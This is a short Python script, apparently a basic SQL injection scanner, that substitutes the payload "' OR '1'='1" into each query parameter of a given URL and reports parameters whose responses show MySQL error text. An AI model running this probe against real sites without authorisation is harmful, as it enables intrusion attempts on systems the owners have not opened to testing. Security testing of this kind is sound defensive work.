import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

def test_sql_injection(url):
    payload = "' OR '1'='1"
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    
    for param in query_params:
        original_value = query_params[param][0]
        query_params[param][0] = payload
        new_query = urlencode(query_params, doseq=True)
        new_url = urlunparse(parsed_url._replace(query=new_query))
        
        response = requests.get(new_url)
        if "SQL syntax" in response.text or "mysql_fetch" in response.text:
            print(f"Potential SQL Injection vulnerability found with parameter: {param}")
        query_params[param][0] = original_value  # Reset to original value

if __name__ == "__main__":
    test_url = input("Enter the URL with query parameters to test: ")
    test_sql_injection(test_url)